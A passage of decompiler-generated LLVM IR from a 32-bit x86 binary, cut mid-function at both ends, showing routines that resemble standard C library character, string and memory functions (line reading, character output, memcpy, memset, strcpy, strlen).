  br i1 %v1_804d324, label %dec_label_pc_804d333, label %dec_label_pc_804d326

dec_label_pc_804d326:                             ; preds = %dec_label_pc_804d315
  %v0_804d326 = load i32, i32* @ebp, align 4
  %v1_804d326 = inttoptr i32 %v0_804d326 to i8*
  %v2_804d326 = load i8, i8* %v1_804d326, align 1
  %v3_804d326 = and i8 %v2_804d326, 8
  %v4_804d326 = icmp eq i8 %v3_804d326, 0
  br i1 %v4_804d326, label %dec_label_pc_804d338, label %dec_label_pc_804d341

dec_label_pc_804d333:                             ; preds = %dec_label_pc_804d315
  %v3_804d32e = load i32, i32* @ebx, align 4
  %v4_804d32e = inttoptr i32 %v3_804d32e to i8*
  store i8 %v1_804d319, i8* %v4_804d32e, align 1
  %v0_804d330 = load i32, i32* @ebx, align 4
  %v1_804d330 = add i32 %v0_804d330, 1
  store i32 %v1_804d330, i32* @ebx, align 4
  %v11_804d331 = icmp eq i8 %v1_804d319, 10
  br i1 %v11_804d331, label %dec_label_pc_804d338, label %dec_label_pc_804d333.dec_label_pc_804d335_crit_edge

dec_label_pc_804d333.dec_label_pc_804d335_crit_edge: ; preds = %dec_label_pc_804d307, %dec_label_pc_804d333
  %v0_804d335.pre = load i32, i32* @esi, align 4
  %v1_804d335 = add i32 %v0_804d335.pre, -1
  %v8_804d335 = icmp eq i32 %v1_804d335, 0
  store i32 %v1_804d335, i32* @esi, align 4
  %v1_804d336 = icmp eq i1 %v8_804d335, false
  br i1 %v1_804d336, label %dec_label_pc_804d333.dec_label_pc_804d335_crit_edge.dec_label_pc_804d2ff_crit_edge, label %dec_label_pc_804d338

dec_label_pc_804d333.dec_label_pc_804d335_crit_edge.dec_label_pc_804d2ff_crit_edge: ; preds = %dec_label_pc_804d333.dec_label_pc_804d335_crit_edge
  %v0_804d2ff.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804d2ff

dec_label_pc_804d338:                             ; preds = %dec_label_pc_804d335.preheader, %dec_label_pc_804d307, %dec_label_pc_804d333.dec_label_pc_804d335_crit_edge, %dec_label_pc_804d333, %dec_label_pc_804d326
  %v0_804d338 = load i32, i32* @ebx, align 4
  %v1_804d338 = load i32, i32* @edi, align 4
  %tmp = icmp ugt i32 %v0_804d338, %v1_804d338
  br i1 %tmp, label %dec_label_pc_804d33c, label %dec_label_pc_804d341

dec_label_pc_804d33c:                             ; preds = %dec_label_pc_804d338
  %v1_804d33c = inttoptr i32 %v0_804d338 to i8*
  store i8 0, i8* %v1_804d33c, align 1
  %v0_804d346.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804d343

dec_label_pc_804d341:                             ; preds = %dec_label_pc_804d338, %dec_label_pc_804d326, %dec_label_pc_804d2e4
  br label %dec_label_pc_804d343

dec_label_pc_804d343:                             ; preds = %dec_label_pc_804d33c, %dec_label_pc_804d341
  %v0_804d346 = phi i32 [ %v0_804d346.pre, %dec_label_pc_804d33c ], [ 0, %dec_label_pc_804d341 ]
  store i32 %v0_804d346, i32* %eax.global-to-local, align 4
  store i32 %v0_804d2e4, i32* @ebp, align 4
  ret i32 %v0_804d346

; uselistorder directives
  uselistorder i32 %v0_804d346, { 1, 0 }
  uselistorder i32 %v0_804d338, { 1, 0 }
  uselistorder i32 %v1_804d335, { 1, 0 }
  uselistorder i32 %v0_804d319, { 0, 2, 1 }
  uselistorder i32 %v0_804d2ff, { 1, 0 }
  uselistorder label %dec_label_pc_804d343, { 1, 0 }
  uselistorder label %dec_label_pc_804d338, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_804d333.dec_label_pc_804d335_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_804d2ff, { 1, 0 }
}

define i32 @function_804d350(i8 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804d350:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-9 = alloca i8, align 1
  %v0_804d350 = load i32, i32* @esi, align 4
  %v0_804d351 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v4_804d359 = sext i8 %arg1 to i32
  store i32 %v4_804d359, i32* @esi, align 4
  %v1_804d35d = add i32 %arg2, 16
  %v2_804d35d = inttoptr i32 %v1_804d35d to i32*
  %v3_804d35d = load i32, i32* %v2_804d35d, align 4
  store i32 %v3_804d35d, i32* %eax.global-to-local, align 4
  %v2_804d360 = add i32 %arg2, 28
  %v3_804d360 = inttoptr i32 %v2_804d360 to i32*
  %v4_804d360 = load i32, i32* %v3_804d360, align 4
  %v10_804d360 = icmp ult i32 %v3_804d35d, %v4_804d360
  %v1_804d363 = icmp eq i1 %v10_804d360, false
  br i1 %v1_804d363, label %dec_label_pc_804d36f, label %dec_label_pc_804d365

dec_label_pc_804d365:                             ; preds = %dec_label_pc_804d350
  store i32 %v4_804d359, i32* %edx.global-to-local, align 4
  %v3_804d367 = inttoptr i32 %v3_804d35d to i8*
  store i8 %arg1, i8* %v3_804d367, align 1
  %v0_804d369 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d369 = add i32 %v0_804d369, 1
  store i32 %v1_804d369, i32* %eax.global-to-local, align 4
  %v1_804d36a = load i32, i32* @ebx, align 4
  %v2_804d36a = add i32 %v1_804d36a, 16
  %v3_804d36a = inttoptr i32 %v2_804d36a to i32*
  store i32 %v1_804d369, i32* %v3_804d36a, align 4
  %v0_804d39a.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d39a

dec_label_pc_804d36f:                             ; preds = %dec_label_pc_804d350
  %v1_804d36f = inttoptr i32 %arg2 to i16*
  %v2_804d36f = load i16, i16* %v1_804d36f, align 2
  %v3_804d36f = zext i16 %v2_804d36f to i32
  %v1_804d372 = and i32 %v3_804d36f, 192
  store i32 %v1_804d372, i32* %eax.global-to-local, align 4
  %v6_804d377 = icmp eq i32 %v1_804d372, 192
  br i1 %v6_804d377, label %dec_label_pc_804d392, label %dec_label_pc_804d37e

dec_label_pc_804d37e:                             ; preds = %dec_label_pc_804d36f
  %v0_804d37e = load i32, i32* @edx, align 4
  %v6_804d386 = call i32 @function_8050134(i16* %v1_804d36f, i32 128, i32 %v0_804d37e, i32 %v0_804d37e)
  store i32 %v6_804d386, i32* %eax.global-to-local, align 4
  %v1_804d38e = icmp eq i32 %v6_804d386, 0
  %v1_804d390 = icmp eq i1 %v1_804d38e, false
  br i1 %v1_804d390, label %dec_label_pc_804d402, label %dec_label_pc_804d37e.dec_label_pc_804d392_crit_edge

dec_label_pc_804d37e.dec_label_pc_804d392_crit_edge: ; preds = %dec_label_pc_804d37e
  %v0_804d392.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804d392

dec_label_pc_804d392:                             ; preds = %dec_label_pc_804d37e.dec_label_pc_804d392_crit_edge, %dec_label_pc_804d36f
  %v0_804d3f5 = phi i32 [ %v0_804d392.pre, %dec_label_pc_804d37e.dec_label_pc_804d392_crit_edge ], [ %arg2, %dec_label_pc_804d36f ]
  %v1_804d392 = add i32 %v0_804d3f5, 4
  %v2_804d392 = inttoptr i32 %v1_804d392 to i32*
  %v3_804d392 = load i32, i32* %v2_804d392, align 4
  %v13_804d392 = icmp eq i32 %v3_804d392, -2
  %v1_804d396 = icmp eq i1 %v13_804d392, false
  br i1 %v1_804d396, label %dec_label_pc_804d39f, label %dec_label_pc_804d398

dec_label_pc_804d398:                             ; preds = %dec_label_pc_804d3e7, %dec_label_pc_804d3d2, %dec_label_pc_804d3cd, %dec_label_pc_804d3bc, %dec_label_pc_804d392
  %v0_804d398 = load i32, i32* @esi, align 4
  store i32 %v0_804d398, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d39a

dec_label_pc_804d39a:                             ; preds = %dec_label_pc_804d365, %dec_label_pc_804d398
  %v0_804d39a = phi i32 [ %v0_804d39a.pre, %dec_label_pc_804d365 ], [ %v0_804d398, %dec_label_pc_804d398 ]
  %v1_804d39a = urem i32 %v0_804d39a, 256
  br label %dec_label_pc_804d405

dec_label_pc_804d39f:                             ; preds = %dec_label_pc_804d392
  %v1_804d39f = add i32 %v0_804d3f5, 12
  %v2_804d39f = inttoptr i32 %v1_804d39f to i32*
  %v3_804d39f = load i32, i32* %v2_804d39f, align 4
  store i32 %v3_804d39f, i32* %eax.global-to-local, align 4
  %v2_804d3a2 = add i32 %v0_804d3f5, 8
  %v3_804d3a2 = inttoptr i32 %v2_804d3a2 to i32*
  %v4_804d3a2 = load i32, i32* %v3_804d3a2, align 4
  %v15_804d3a2 = icmp eq i32 %v3_804d39f, %v4_804d3a2
  br i1 %v15_804d3a2, label %dec_label_pc_804d3e7, label %dec_label_pc_804d3a7

dec_label_pc_804d3a7:                             ; preds = %dec_label_pc_804d39f
  %v2_804d3a7 = add i32 %v0_804d3f5, 16
  %v3_804d3a7 = inttoptr i32 %v2_804d3a7 to i32*
  %v4_804d3a7 = load i32, i32* %v3_804d3a7, align 4
  %v15_804d3a7 = icmp eq i32 %v3_804d39f, %v4_804d3a7
  %v1_804d3aa = icmp eq i1 %v15_804d3a7, false
  br i1 %v1_804d3aa, label %dec_label_pc_804d3bc, label %dec_label_pc_804d3ac

dec_label_pc_804d3ac:                             ; preds = %dec_label_pc_804d3a7
  %v2_804d3b0 = call i32 @function_804c2c0(i32 %v0_804d3f5)
  store i32 %v2_804d3b0, i32* %eax.global-to-local, align 4
  %v1_804d3b8 = icmp eq i32 %v2_804d3b0, 0
  %v1_804d3ba = icmp eq i1 %v1_804d3b8, false
  br i1 %v1_804d3ba, label %dec_label_pc_804d402, label %dec_label_pc_804d3ac.dec_label_pc_804d3bc_crit_edge

dec_label_pc_804d3ac.dec_label_pc_804d3bc_crit_edge: ; preds = %dec_label_pc_804d3ac
  %v0_804d3bc.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804d3bc

dec_label_pc_804d3bc:                             ; preds = %dec_label_pc_804d3ac.dec_label_pc_804d3bc_crit_edge, %dec_label_pc_804d3a7
  %v0_804d3bc = phi i32 [ %v0_804d3bc.pre, %dec_label_pc_804d3ac.dec_label_pc_804d3bc_crit_edge ], [ %v0_804d3f5, %dec_label_pc_804d3a7 ]
  %v1_804d3bc = add i32 %v0_804d3bc, 16
  %v2_804d3bc = inttoptr i32 %v1_804d3bc to i32*
  %v3_804d3bc = load i32, i32* %v2_804d3bc, align 4
  store i32 %v3_804d3bc, i32* %eax.global-to-local, align 4
  %v0_804d3bf = load i32, i32* @esi, align 4
  store i32 %v0_804d3bf, i32* %edx.global-to-local, align 4
  %v1_804d3c1 = trunc i32 %v0_804d3bf to i8
  %v3_804d3c1 = inttoptr i32 %v3_804d3bc to i8*
  store i8 %v1_804d3c1, i8* %v3_804d3c1, align 1
  %v0_804d3c3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d3c3 = add i32 %v0_804d3c3, 1
  store i32 %v1_804d3c3, i32* %eax.global-to-local, align 4
  %v0_804d3c4 = load i32, i32* @ebx, align 4
  %v1_804d3c4 = add i32 %v0_804d3c4, 1
  %v2_804d3c4 = inttoptr i32 %v1_804d3c4 to i8*
  %v3_804d3c4 = load i8, i8* %v2_804d3c4, align 1
  %v4_804d3c4 = urem i8 %v3_804d3c4, 2
  %v5_804d3c4 = icmp eq i8 %v4_804d3c4, 0
  %v2_804d3c8 = add i32 %v0_804d3c4, 16
  %v3_804d3c8 = inttoptr i32 %v2_804d3c8 to i32*
  store i32 %v1_804d3c3, i32* %v3_804d3c8, align 4
  br i1 %v5_804d3c4, label %dec_label_pc_804d398, label %dec_label_pc_804d3cd

dec_label_pc_804d3cd:                             ; preds = %dec_label_pc_804d3bc
  %v0_804d3cd = load i32, i32* %edx.global-to-local, align 4
  %v1_804d3cd = trunc i32 %v0_804d3cd to i8
  %v10_804d3cd = icmp eq i8 %v1_804d3cd, 10
  %v1_804d3d0 = icmp eq i1 %v10_804d3cd, false
  br i1 %v1_804d3d0, label %dec_label_pc_804d398, label %dec_label_pc_804d3d2

dec_label_pc_804d3d2:                             ; preds = %dec_label_pc_804d3cd
  %v0_804d3d5 = load i32, i32* @ebx, align 4
  %v2_804d3d6 = call i32 @function_804c2c0(i32 %v0_804d3d5)
  store i32 %v2_804d3d6, i32* %eax.global-to-local, align 4
  %v1_804d3de = icmp eq i32 %v2_804d3d6, 0
  br i1 %v1_804d3de, label %dec_label_pc_804d398, label %dec_label_pc_804d3e2

dec_label_pc_804d3e2:                             ; preds = %dec_label_pc_804d3d2
  %v0_804d3e2 = load i32, i32* @ebx, align 4
  %v1_804d3e2 = add i32 %v0_804d3e2, 16
  %v2_804d3e2 = inttoptr i32 %v1_804d3e2 to i32*
  %v3_804d3e2 = load i32, i32* %v2_804d3e2, align 4
  %v4_804d3e2 = add i32 %v3_804d3e2, -1
  store i32 %v4_804d3e2, i32* %v2_804d3e2, align 4
  br label %dec_label_pc_804d402

dec_label_pc_804d3e7:                             ; preds = %dec_label_pc_804d39f
  %v0_804d3e7 = load i32, i32* @esi, align 4
  store i32 %v0_804d3e7, i32* @ecx, align 4
  %v6_804d3e9 = trunc i32 %v0_804d3e7 to i8
  store i8 %v6_804d3e9, i8* %stack_var_-9, align 1
  %v2_804d3f0 = ptrtoint i8* %stack_var_-9 to i32
  store i32 %v2_804d3f0, i32* %eax.global-to-local, align 4
  %v5_804d3f5 = inttoptr i32 %v0_804d3f5 to i16*
  %v6_804d3f6 = call i32 @function_804ffc8(i16* %v5_804d3f5, i32 %v2_804d3f0, i32 1, i32 %v3_804d39f)
  store i32 %v6_804d3f6, i32* %eax.global-to-local, align 4
  %v1_804d3fe = icmp eq i32 %v6_804d3f6, 0
  %v1_804d400 = icmp eq i1 %v1_804d3fe, false
  br i1 %v1_804d400, label %dec_label_pc_804d398, label %dec_label_pc_804d402

dec_label_pc_804d402:                             ; preds = %dec_label_pc_804d3e7, %dec_label_pc_804d3ac, %dec_label_pc_804d37e, %dec_label_pc_804d3e2
  br label %dec_label_pc_804d405

dec_label_pc_804d405:                             ; preds = %dec_label_pc_804d39a, %dec_label_pc_804d402
  %storemerge = phi i32 [ %v1_804d39a, %dec_label_pc_804d39a ], [ -1, %dec_label_pc_804d402 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_804d351, i32* @ebx, align 4
  store i32 %v0_804d350, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_804d39f, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804d3f5, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32* %eax.global-to-local, { 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_804d405, { 1, 0 }
  uselistorder label %dec_label_pc_804d402, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_804d39a, { 1, 0 }
}

define i32 @function_804d40c() local_unnamed_addr {
dec_label_pc_804d40c:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804d40c = load i32, i32* @esi, align 4
  %v0_804d40d = load i32, i32* @ebx, align 4
  store i32 %v0_804d40d, i32* %stack_var_-8, align 4
  store i32 %tmp1, i32* @ebx, align 4
  %v1_804d416 = inttoptr i32 %tmp1 to i8*
  %v2_804d416 = call i32 @function_804d514(i8* %v1_804d416)
  store i32 %v2_804d416, i32* @esi, align 4
  %v0_804d427 = load i32, i32* @ebx, align 4
  %v5_804d428 = call i32 @function_804d440(i32 %v0_804d427, i64 1, i32 %v2_804d416, i32 %tmp)
  %v1_804d432 = load i32, i32* @esi, align 4
  %v12_804d432 = icmp eq i32 %v5_804d428, %v1_804d432
  %v3_804d434 = select i1 %v12_804d432, i32 %v5_804d428, i32 -1
  %v2_804d43a = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804d43a, i32* @ebx, align 4
  store i32 %v0_804d40c, i32* @esi, align 4
  ret i32 %v3_804d434

; uselistorder directives
  uselistorder i32 %v5_804d428, { 1, 0 }
  uselistorder i32 %tmp1, { 1, 0 }
}

define i32 @function_804d440(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804d440:
  %stack_var_-28 = alloca i32, align 4
  %v0_804d440 = load i32, i32* @edi, align 4
  %v0_804d441 = load i32, i32* @esi, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_804d447 = trunc i64 %arg2 to i32
  store i32 %v4_804d447, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_804d44f = inttoptr i32 %arg4 to i16*
  %v2_804d44f = load i16, i16* %v1_804d44f, align 2
  %v1_804d452 = and i16 %v2_804d44f, 192
  %v6_804d457 = icmp eq i16 %v1_804d452, 192
  br i1 %v6_804d457, label %dec_label_pc_804d472, label %dec_label_pc_804d45e

dec_label_pc_804d45e:                             ; preds = %dec_label_pc_804d440
  %v0_804d45e = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
  %v6_804d466 = call i32 @function_8050134(i16* %v1_804d44f, i32 128, i32 %v0_804d45e, i32 %v0_804d45e)
  %v1_804d46e = icmp eq i32 %v6_804d466, 0
  %v1_804d470 = icmp eq i1 %v1_804d46e, false
  br i1 %v1_804d470, label %dec_label_pc_804d4b2, label %dec_label_pc_804d472

dec_label_pc_804d472:                             ; preds = %dec_label_pc_804d45e, %dec_label_pc_804d440
  %v2_804d472 = icmp eq i32 %v4_804d447, 0
  br i1 %v2_804d472, label %dec_label_pc_804d4b2, label %dec_label_pc_804d476

dec_label_pc_804d476:                             ; preds = %dec_label_pc_804d472
  %v1_804d476 = icmp eq i32 %arg3, 0
  br i1 %v1_804d476, label %dec_label_pc_804d4b2, label %dec_label_pc_804d47a

dec_label_pc_804d47a:                             ; preds = %dec_label_pc_804d476
  %v9_804d47f = udiv i64 4294967295, %arg2
  %v10_804d47f = trunc i64 %v9_804d47f to i32
  %v6_804d483 = icmp ult i32 %v10_804d47f, %arg3
  br i1 %v6_804d483, label %dec_label_pc_804d49f, label %dec_label_pc_804d485

dec_label_pc_804d485:                             ; preds = %dec_label_pc_804d47a
  %sext = mul i64 %arg2, 4294967296
  %v2_804d488 = sdiv i64 %sext, 4294967296
  %v3_804d488 = sext i32 %arg3 to i64
  %v4_804d488 = mul nsw i64 %v3_804d488, %v2_804d488
  %v5_804d488 = trunc i64 %v4_804d488 to i32
  %v0_804d48b = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v5_804d491 = call i32 @function_8050048(i32 %arg1, i32 %v5_804d488, i32 %v0_804d48b, i32 %v10_804d47f)
  %v6_804d491 = sext i32 %v5_804d491 to i64
  %v10_804d49b = udiv i64 %v6_804d491, %arg2
  %v11_804d49b = trunc i64 %v10_804d49b to i32
  br label %dec_label_pc_804d4b4

dec_label_pc_804d49f:                             ; preds = %dec_label_pc_804d47a
  %v0_804d49f = load i32, i32* @ebx, align 4
  %v1_804d49f = inttoptr i32 %v0_804d49f to i32*
  %v2_804d49f = load i32, i32* %v1_804d49f, align 4
  %v1_804d4a1 = or i32 %v2_804d49f, 8
  %v1_804d4a4 = trunc i32 %v1_804d4a1 to i16
  %v3_804d4a4 = inttoptr i32 %v0_804d49f to i16*
  store i16 %v1_804d4a4, i16* %v3_804d4a4, align 2
  %v0_804d4a7 = load i32, i32* %stack_var_-28, align 4
  %v1_804d4a7 = call i32 @function_804baa4(i32 %v0_804d4a7)
  %v1_804d4ac = inttoptr i32 %v1_804d4a7 to i32*
  store i32 22, i32* %v1_804d4ac, align 4
  br label %dec_label_pc_804d4b2

dec_label_pc_804d4b2:                             ; preds = %dec_label_pc_804d476, %dec_label_pc_804d472, %dec_label_pc_804d45e, %dec_label_pc_804d49f
  br label %dec_label_pc_804d4b4

dec_label_pc_804d4b4:                             ; preds = %dec_label_pc_804d485, %dec_label_pc_804d4b2
  %v0_804d4b7 = phi i32 [ %v11_804d49b, %dec_label_pc_804d485 ], [ 0, %dec_label_pc_804d4b2 ]
  store i32 %v0_804d441, i32* @esi, align 4
  store i32 %v0_804d440, i32* @edi, align 4
  ret i32 %v0_804d4b7

; uselistorder directives
  uselistorder i32 %v0_804d45e, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_8050048, { 5, 4, 3, 0, 1, 6, 2 }
  uselistorder i32 (i16*, i32, i32, i32)* @function_8050134, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i64 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804d4b4, { 1, 0 }
  uselistorder label %dec_label_pc_804d4b2, { 3, 0, 1, 2 }
}

define i32 @function_804d4b8(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804d4b8:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804d4b9 = load i32, i32* @esi, align 4
  store i32 %v0_804d4b9, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_804d4ba = sdiv i32 %sext, 16777216
  store i32 %v4_804d4ba, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804d4c2 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804d4c2, i32* %edi.global-to-local, align 4
  %v2_804d4c8 = udiv i32 %v4_804d4ba, 4
  %v3_804d4cb = inttoptr i32 %arg2 to i8*
  %v4_804d4cb = bitcast i16* %arg1 to i8*
  %v5_804d4cb = call i8* @_memcpy(i8* %v4_804d4cb, i8* %v3_804d4cb, i32 %v2_804d4c8)
  %v6_804d4cb = ptrtoint i8* %v5_804d4cb to i32
  store i32 %v6_804d4cb, i32* @ecx, align 4
  %v0_804d4cd = load i32, i32* %eax.global-to-local, align 4
  %v2_804d4cd = and i32 %v0_804d4cd, 2
  %v3_804d4cd = icmp eq i32 %v2_804d4cd, 0
  br i1 %v3_804d4cd, label %dec_label_pc_804d4d3, label %dec_label_pc_804d4d1

dec_label_pc_804d4d1:                             ; preds = %dec_label_pc_804d4b8
  %v0_804d4d1 = load i32, i32* %esi.global-to-local, align 4
  %v1_804d4d1 = inttoptr i32 %v0_804d4d1 to i16*
  %v2_804d4d1 = load i16, i16* %v1_804d4d1, align 2
  %v3_804d4d1 = load i32, i32* %edi.global-to-local, align 4
  %v4_804d4d1 = inttoptr i32 %v3_804d4d1 to i16*
  store i16 %v2_804d4d1, i16* %v4_804d4d1, align 2
  %v5_804d4d1 = load i32, i32* %edi.global-to-local, align 4
  %v6_804d4d1 = load i32, i32* %esi.global-to-local, align 4
  %v7_804d4d1 = load i1, i1* @df, align 1
  %v8_804d4d1 = select i1 %v7_804d4d1, i32 -2, i32 2
  %v9_804d4d1 = add i32 %v8_804d4d1, %v5_804d4d1
  %v10_804d4d1 = add i32 %v8_804d4d1, %v6_804d4d1
  store i32 %v9_804d4d1, i32* %edi.global-to-local, align 4
  store i32 %v10_804d4d1, i32* %esi.global-to-local, align 4
  %v0_804d4d3.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d4d3

dec_label_pc_804d4d3:                             ; preds = %dec_label_pc_804d4b8, %dec_label_pc_804d4d1
  %v0_804d4d3 = phi i32 [ %v0_804d4cd, %dec_label_pc_804d4b8 ], [ %v0_804d4d3.pre, %dec_label_pc_804d4d1 ]
  %v2_804d4d3 = urem i32 %v0_804d4d3, 2
  %v3_804d4d3 = icmp eq i32 %v2_804d4d3, 0
  br i1 %v3_804d4d3, label %dec_label_pc_804d4d8, label %dec_label_pc_804d4d7

dec_label_pc_804d4d7:                             ; preds = %dec_label_pc_804d4d3
  %v0_804d4d7 = load i32, i32* %esi.global-to-local, align 4
  %v1_804d4d7 = inttoptr i32 %v0_804d4d7 to i8*
  %v2_804d4d7 = load i8, i8* %v1_804d4d7, align 1
  %v3_804d4d7 = load i32, i32* %edi.global-to-local, align 4
  %v4_804d4d7 = inttoptr i32 %v3_804d4d7 to i8*
  store i8 %v2_804d4d7, i8* %v4_804d4d7, align 1
  %v5_804d4d7 = load i32, i32* %edi.global-to-local, align 4
  %v6_804d4d7 = load i32, i32* %esi.global-to-local, align 4
  %v7_804d4d7 = load i1, i1* @df, align 1
  %v8_804d4d7 = select i1 %v7_804d4d7, i32 -1, i32 1
  %v9_804d4d7 = add i32 %v8_804d4d7, %v5_804d4d7
  %v10_804d4d7 = add i32 %v8_804d4d7, %v6_804d4d7
  store i32 %v9_804d4d7, i32* %edi.global-to-local, align 4
  store i32 %v10_804d4d7, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804d4d8

dec_label_pc_804d4d8:                             ; preds = %dec_label_pc_804d4d3, %dec_label_pc_804d4d7
  store i32 %v4_804d4c2, i32* %eax.global-to-local, align 4
  %v2_804d4dc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804d4dc, i32* @esi, align 4
  ret i32 %v4_804d4c2

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_804d4d8, { 1, 0 }
  uselistorder label %dec_label_pc_804d4d3, { 1, 0 }
}

define i32 @function_804d4e0(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804d4e0:
  %v0_804d4e0 = load i32, i32* @edi, align 4
  %v4_804d4e9 = ptrtoint i8* %arg1 to i32
  %v5_804d4ed = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_804d4ed = ptrtoint i8* %v5_804d4ed to i32
  store i32 %v6_804d4ed, i32* @ecx, align 4
  store i32 %v0_804d4e0, i32* @edi, align 4
  ret i32 %v4_804d4e9

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @function_804d4f8(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804d4f8:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804d4f9 = load i32, i32* @esi, align 4
  store i32 %v0_804d4f9, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804d501 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804d501, i32* %edi.global-to-local, align 4
  %v4_804d505.pre = load i32, i32* @eax, align 4
  %v8_804d505.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_804d505

dec_label_pc_804d505:                             ; preds = %dec_label_pc_804d505.dec_label_pc_804d505_crit_edge, %dec_label_pc_804d4f8
  %v2_804d506 = phi i32 [ %v7_804d506, %dec_label_pc_804d505.dec_label_pc_804d505_crit_edge ], [ %v4_804d501, %dec_label_pc_804d4f8 ]
  %v8_804d505 = phi i1 [ %v5_804d506, %dec_label_pc_804d505.dec_label_pc_804d505_crit_edge ], [ %v8_804d505.pre, %dec_label_pc_804d4f8 ]
  %v4_804d505 = phi i32 [ %v0_804d507, %dec_label_pc_804d505.dec_label_pc_804d505_crit_edge ], [ %v4_804d505.pre, %dec_label_pc_804d4f8 ]
  %v7_804d505 = phi i32 [ %v0_804d505.pre, %dec_label_pc_804d505.dec_label_pc_804d505_crit_edge ], [ %arg2, %dec_label_pc_804d4f8 ]
  %v1_804d505 = inttoptr i32 %v7_804d505 to i8*
  %v2_804d505 = load i8, i8* %v1_804d505, align 1
  %v3_804d505 = zext i8 %v2_804d505 to i32
  %v5_804d505 = and i32 %v4_804d505, -256
  %v6_804d505 = or i32 %v3_804d505, %v5_804d505
  store i32 %v6_804d505, i32* %eax.global-to-local, align 4
  %v9_804d505 = select i1 %v8_804d505, i32 -1, i32 1
  %v10_804d505 = add i32 %v7_804d505, %v9_804d505
  store i32 %v10_804d505, i32* %esi.global-to-local, align 4
  %v3_804d506 = inttoptr i32 %v2_804d506 to i8*
  store i8 %v2_804d505, i8* %v3_804d506, align 1
  %v4_804d506 = load i32, i32* %edi.global-to-local, align 4
  %v5_804d506 = load i1, i1* @df, align 1
  %v6_804d506 = select i1 %v5_804d506, i32 -1, i32 1
  %v7_804d506 = add i32 %v6_804d506, %v4_804d506
  store i32 %v7_804d506, i32* %edi.global-to-local, align 4
  %v0_804d507 = load i32, i32* %eax.global-to-local, align 4
  %v3_804d507 = trunc i32 %v0_804d507 to i8
  %v4_804d507 = icmp eq i8 %v3_804d507, 0
  %v1_804d509 = icmp eq i1 %v4_804d507, false
  br i1 %v1_804d509, label %dec_label_pc_804d505.dec_label_pc_804d505_crit_edge, label %dec_label_pc_804d50b

dec_label_pc_804d505.dec_label_pc_804d505_crit_edge: ; preds = %dec_label_pc_804d505
  %v0_804d505.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804d505

dec_label_pc_804d50b:                             ; preds = %dec_label_pc_804d505
  store i32 %v4_804d501, i32* %eax.global-to-local, align 4
  %v2_804d510 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804d510, i32* @esi, align 4
  ret i32 %v4_804d501

; uselistorder directives
  uselistorder i32 %v0_804d507, { 1, 0 }
  uselistorder i32 %v7_804d506, { 1, 0 }
  uselistorder i1 %v5_804d506, { 1, 0 }
  uselistorder i32 %v4_804d501, { 1, 2, 0, 3 }
}

define i32 @function_804d514(i8* %arg1) local_unnamed_addr {
dec_label_pc_804d514:
  %v0_804d514 = load i32, i32* @edi, align 4
  %v3_804d51e = call i32 @_strlen(i8* %arg1)
  store i32 %v3_804d51e, i32* @ecx, align 4
